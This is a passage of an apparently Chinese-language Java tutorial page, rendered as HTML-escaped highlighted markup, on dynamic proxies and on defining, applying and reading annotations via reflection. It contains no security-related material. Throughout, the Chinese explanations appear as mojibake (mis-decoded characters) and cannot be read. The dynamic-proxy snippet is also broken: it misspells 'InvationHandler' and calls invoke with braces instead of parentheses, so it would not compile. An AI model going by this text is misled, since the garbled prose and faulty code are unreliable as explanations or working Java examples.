&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">InvationHandler&lt;/span> &lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">HelloDynamicProxy&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InvocationHandler&lt;/span> &lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">handler&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">morning&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Hello&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;morning&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>åªä¸è¿‡JVMç›´æŽ¥ç¼–å†™äº†è¿™ä¸ªä¸­é—´çš„ç±»ï¼Œä¸éœ€è¦æºç ï¼Œå¯ä»¥ç›´æŽ¥ç”Ÿæˆå­—èŠ‚ç &lt;/p>
&lt;h2 id="æ³¨è§£">æ³¨è§£&lt;/h2>
&lt;p>æ³¨è§£Annotationï¼Œæ˜¯æ”¾åœ¨Javaæºç çš„ç±»ã€æ–¹æ³•ã€å­—æ®µã€å‚æ•°å‰çš„ä¸€ç§ç‰¹æ®Šæ³¨é‡Š&lt;/p>
&lt;h3 id="ä½¿ç”¨å®šä¹‰æ³¨è§£">ä½¿ç”¨&amp;amp;å®šä¹‰æ³¨è§£&lt;/h3>
&lt;p>æ³¨è§£å¯åˆ†ä¸ºä¸‰ç±»&lt;/p>
&lt;ul>
&lt;li>1 ç¼–è¯‘å™¨ä½¿ç”¨çš„æ³¨è§£ï¼šè¿™ç±»æ³¨è§£ä¸ä¼šè¢«ç¼–è¯‘è¿›å…¥&lt;code>.class&lt;/code>æ–‡ä»¶ï¼Œå®ƒä»¬åœ¨ç¼–è¯‘åŽå°±è¢«ç¼–è¯‘å™¨æ‰”æŽ‰äº†&lt;/li>
&lt;/ul>
&lt;p>&lt;code>@Override&lt;/code>ï¼šè®©ç¼–è¯‘å™¨æ£€æŸ¥è¯¥æ–¹æ³•æ˜¯å¦æ­£ç¡®åœ°å®žçŽ°äº†è¦†å†™&lt;/p>
&lt;p>&lt;code>@SuppressWarnings&lt;/code>ï¼šå‘Šè¯‰ç¼–è¯‘å™¨å¿½ç•¥æ­¤å¤„ä»£ç äº§ç”Ÿçš„è­¦å‘Š&lt;/p>
&lt;ul>
&lt;li>2 ç”±å·¥å…·å¤„ç†&lt;code>.class&lt;/code>æ–‡ä»¶ä½¿ç”¨çš„æ³¨è§£ï¼šæœ‰äº›å·¥å…·ä¼šåœ¨åŠ è½½classçš„æ—¶å€™ï¼Œå¯¹classåšåŠ¨æ€ä¿®æ”¹ï¼Œå®žçŽ°ä¸€äº›ç‰¹æ®Šçš„åŠŸèƒ½ï¼›è¿™ç±»æ³¨è§£ä¼šè¢«ç¼–è¯‘è¿›å…¥&lt;code>.class&lt;/code>æ–‡ä»¶ï¼Œä½†åŠ è½½ç»“æŸåŽå¹¶ä¸ä¼šå­˜åœ¨äºŽå†…å­˜ä¸­&lt;/li>
&lt;li>3 ç¨‹åºè¿è¡ŒæœŸå¯è¯»å–çš„æ³¨è§£ï¼šåŠ è½½åŽä¸€ç›´å­˜åœ¨äºŽJVMä¸­ï¼Œè¿™ä¹Ÿæ˜¯æœ€å¸¸ç”¨çš„æ³¨è§£&lt;/li>
&lt;/ul>
&lt;p>&lt;code>@PostConstruct&lt;/code>ï¼šé…ç½®äº†å®ƒçš„æ–¹æ³•ä¼šåœ¨è°ƒç”¨æž„é€ æ–¹æ³•åŽè‡ªåŠ¨è¢«è°ƒç”¨ï¼Œè¿™æ˜¯Javaä»£ç è¯»å–è¯¥æ³¨è§£å®žçŽ°çš„åŠŸèƒ½ï¼ŒJVMå¹¶ä¸ä¼šè¯†åˆ«è¯¥æ³¨è§£&lt;/p>
&lt;ul>
&lt;li>å®šä¹‰ä¸€ä¸ªæ³¨è§£æ—¶ï¼Œè¿˜å¯ä»¥å®šä¹‰é…ç½®å‚æ•°ï¼Œé…ç½®å‚æ•°å¯ä»¥åŒ…æ‹¬ï¼šåŸºæœ¬ç±»åž‹ï¼ŒStringï¼Œæžšä¸¾ç±»ï¼ŒåŸºæœ¬ç±»åž‹ã€Stringã€Classä»¥åŠæžšä¸¾çš„æ•°ç»„ï¼›å¯ä»¥è®¾ç½®ç¼ºçœå€¼ï¼Œå¦‚æžœåªå†™æ³¨è§£ï¼Œç›¸å½“äºŽå…¨éƒ¨ä½¿ç”¨é»˜è®¤å€¼&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Hello&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Check&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">min&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">max&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">100&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">55&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Check&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">99&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Check&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">99&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#75715e">// @Check(value=99)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Check&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>@Check&lt;/code>å°±æ˜¯ä¸€ä¸ªæ³¨è§£&lt;/p>
&lt;ul>
&lt;li>æœ‰ä¸€äº›æ³¨è§£å¯ä»¥ä¿®é¥°å…¶ä»–æ³¨è§£ï¼Œè¿™äº›æ³¨è§£å°±ç§°ä¸ºå…ƒæ³¨è§£Meta annotation&lt;/li>
&lt;/ul>
&lt;p>&lt;code>@Target&lt;/code>ï¼šä½¿ç”¨&lt;code>@Target&lt;/code>å¯ä»¥å®šä¹‰&lt;code>Annotation&lt;/code>èƒ½å¤Ÿè¢«åº”ç”¨äºŽæºç çš„å“ªäº›ä½ç½®&lt;/p>
&lt;pre tabindex="0">&lt;code>ç±»æˆ–æŽ¥å£ï¼šElementType.TYPE
å­—æ®µï¼šElementType.FIELD
æ–¹æ³•ï¼šElementType.METHOD
æž„é€ æ–¹æ³•ï¼šElementType.CONSTRUCTOR
æ–¹æ³•å‚æ•°ï¼šElementType.PARAMETER
&lt;/code>&lt;/pre>&lt;p>&lt;code>@Retention&lt;/code>ï¼šå®šä¹‰äº†&lt;code>Annotation&lt;/code>çš„ç”Ÿå‘½å‘¨æœŸï¼Œé€šå¸¸æˆ‘ä»¬è‡ªå®šä¹‰çš„&lt;code>Annotation&lt;/code>éƒ½æ˜¯&lt;code>RUNTIME&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code>ä»…ç¼–è¯‘æœŸï¼šRetentionPolicy.SOURCE ç¼–è¯‘å™¨è¢«ä¸¢æŽ‰ ä¸€èˆ¬ä¸ç”¨(ç¼–è¯‘å™¨ä½¿ç”¨)
ä»…classæ–‡ä»¶ï¼šRetentionPolicy.CLASS ä»…ä¿å­˜åœ¨classæ–‡ä»¶ä¸­ ä¸ä¼šè¢«åŠ è½½å…¥JVM(åº•å±‚å·¥å…·åº“ä½¿ç”¨ æ¶‰åŠclassçš„åŠ è½½)
è¿è¡ŒæœŸï¼šRetentionPolicy.RUNTIME ä¼šè¢«åŠ è½½è¿›JVM å¹¶åœ¨è¿è¡ŒæœŸè¢«ç¨‹åºè¯»å–(å¸¸ç”¨)
&lt;/code>&lt;/pre>&lt;p>&lt;code>@Repeatable&lt;/code>ï¼šå®šä¹‰&lt;code>Annotation&lt;/code>æ˜¯å¦å¯é‡å¤&lt;/p>
&lt;p>&lt;code>@Inherited&lt;/code>ï¼šå®šä¹‰å­ç±»æ˜¯å¦å¯ç»§æ‰¿çˆ¶ç±»å®šä¹‰çš„&lt;code>Annotatio&lt;/code>ï¼Œä»…é’ˆå¯¹&lt;code>@Target(ElementType.TYPE)&lt;/code>ç±»åž‹çš„&lt;code>annotation&lt;/code>æœ‰æ•ˆï¼Œå¹¶ä¸”ä»…é’ˆå¯¹&lt;code>class&lt;/code>çš„ç»§æ‰¿ï¼Œå¯¹&lt;code>interface&lt;/code>çš„ç»§æ‰¿æ— æ•ˆ&lt;/p>
&lt;ul>
&lt;li>ä½¿ç”¨&lt;code>@interface&lt;/code>è¯­æ³•æ¥å®šä¹‰æ³¨è§£ï¼Œç”¨å…ƒæ³¨é‡Šæ¥é…ç½®æ³¨é‡Šï¼Œå…¶ä¸­&lt;code>@Target&lt;/code>å’Œ&lt;code>@Retention&lt;/code>(ä¸€èˆ¬è®¾ä¸ºRUNTIME)å¿…é¡»è®¾ç½®&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@Target&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ElementType&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">TYPE&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@Retention&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">RetentionPolicy&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">RUNTIME&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">@interface&lt;/span> &lt;span style="color:#111">Report&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">default&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">level&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">default&lt;/span> &lt;span style="color:#d88200">&amp;#34;info&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">default&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="å¤„ç†æ³¨è§£">å¤„ç†æ³¨è§£&lt;/h3>
&lt;p>æ³¨è§£æœ¬èº«å¯¹ä»£ç é€»è¾‘æ²¡æœ‰ä»»ä½•å½±å“ï¼Œå¦‚ä½•ä½¿ç”¨æ³¨è§£å®Œå…¨ç”±å·¥å…·å†³å®š&lt;/p>
&lt;p>æ³¨è§£å®šä¹‰åŽä¹Ÿæ˜¯ä¸€ç§&lt;code>class&lt;/code>ï¼Œæ‰€æœ‰çš„æ³¨è§£éƒ½ç»§æ‰¿è‡ª&lt;code>java.lang.annotation.Annotation&lt;/code>ï¼Œæ‰€ä»¥è¯»å–æ³¨è§£éœ€è¦ç”¨åˆ°åå°„&lt;/p>
&lt;p>åˆ¤æ–­æŸä¸ªæ³¨è§£æ˜¯å¦å­˜åœ¨äºŽ&lt;code>Class&lt;/code>ã€&lt;code>Field&lt;/code>ã€&lt;code>Method&lt;/code>æˆ–&lt;code>Constructor&lt;/code>ï¼š&lt;/p>
&lt;ul>
&lt;li>&lt;code>Class.isAnnotationPresent(Class)&lt;/code>&lt;/li>
&lt;li>&lt;code>Field.isAnnotationPresent(Class)&lt;/code>&lt;/li>
&lt;li>&lt;code>Method.isAnnotationPresent(Class)&lt;/code>&lt;/li>
&lt;li>&lt;code>Constructor.isAnnotationPresent(Class)&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// åˆ¤æ–­@Reportæ˜¯å¦å­˜åœ¨äºŽPersonç±»:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Person&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isAnnotationPresent&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Report&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>åå°„APIè¯»å–Annotationï¼š&lt;/p>
&lt;ul>
&lt;li>&lt;code>Class.getAnnotation(Class)&lt;/code>&lt;/li>
&lt;li>&lt;code>Field.getAnnotation(Class)&lt;/code>&lt;/li>
&lt;li>&lt;code>Method.getAnnotation(Class)&lt;/code>&lt;/li>
&lt;li>&lt;code>Constructor.getAnnotation(Class)&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// èŽ·å–Personå®šä¹‰çš„@Reportæ³¨è§£:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Report&lt;/span> &lt;span style="color:#111">report&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Person&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getAnnotation&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Report&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">type&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">report&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">level&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">report&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">level&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä½¿ç”¨åå°„APIè¯»å–&lt;code>Annotation&lt;/code>æœ‰ä¸¤ç§æ–¹æ³•ã€‚æ–¹æ³•ä¸€æ˜¯å…ˆåˆ¤æ–­&lt;code>Annotation&lt;/code>æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æžœå­˜åœ¨ï¼Œå°±ç›´æŽ¥è¯»å–ï¼š&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Person&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isAnnotationPresent&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Report&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Report&lt;/span> &lt;span style="color:#111">report&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getAnnotation&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Report&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç¬¬äºŒç§æ–¹æ³•æ˜¯ç›´æŽ¥è¯»å–&lt;code>Annotation&lt;/code>ï¼Œå¦‚æžœ&lt;code>Annotation&lt;/code>ä¸å­˜åœ¨ï¼Œå°†è¿”å›ž&lt;code>null&lt;/code>ï¼š&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Person&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Report&lt;/span> &lt;span style="color:#111">report&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getAnnotation&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Report&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">report&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¯»å–æ–¹æ³•ã€å­—æ®µå’Œæž„é€ æ–¹æ³•çš„&lt;code>Annotation&lt;/code>å’ŒClassç±»ä¼¼ã€‚ä½†è¦è¯»å–æ–¹æ³•å‚æ•°çš„&lt;code>Annotation&lt;/code>å°±æ¯”è¾ƒéº»çƒ¦ä¸€ç‚¹ï¼Œå› ä¸ºæ–¹æ³•å‚æ•°æœ¬èº«å¯ä»¥çœ‹æˆä¸€ä¸ªæ•°ç»„ï¼Œè€Œæ¯ä¸ªå‚æ•°åˆå¯ä»¥å®šä¹‰å¤šä¸ªæ³¨è§£ï¼Œæ‰€ä»¥ï¼Œä¸€æ¬¡èŽ·å–æ–¹æ³•å‚æ•°çš„æ‰€æœ‰æ³¨è§£å°±å¿…é¡»ç”¨ä¸€ä¸ªäºŒç»´æ•°ç»„æ¥è¡¨ç¤ºã€‚ä¾‹å¦‚ï¼Œå¯¹äºŽä»¥ä¸‹æ–¹æ³•å®šä¹‰çš„æ³¨è§£ï¼š&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">hello&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#75af00">@NotNull&lt;/span> &lt;span style="color:#75af00">@Range&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">max&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">5&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#75af00">@NotNull&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">prefix&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¦è¯»å–æ–¹æ³•å‚æ•°çš„æ³¨è§£ï¼Œæˆ‘ä»¬å…ˆç”¨åå°„èŽ·å–&lt;code>Method&lt;/code>å®žä¾‹ï¼Œç„¶åŽè¯»å–æ–¹æ³•å‚æ•°çš„æ‰€æœ‰æ³¨è§£ï¼š&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// èŽ·å–Methodå®žä¾‹:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Method&lt;/span> &lt;span style="color:#111">m&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// èŽ·å–æ‰€æœ‰å‚æ•°çš„Annotation:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Annotation&lt;/span>&lt;span style="color:#f92672">[][]&lt;/span> &lt;span style="color:#111">annos&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getParameterAnnotations&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// ç¬¬ä¸€ä¸ªå‚æ•°ï¼ˆç´¢å¼•ä¸º0ï¼‰çš„æ‰€æœ‰Annotation:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Annotation&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">annosOfName&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">annos&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">];&lt;/span>
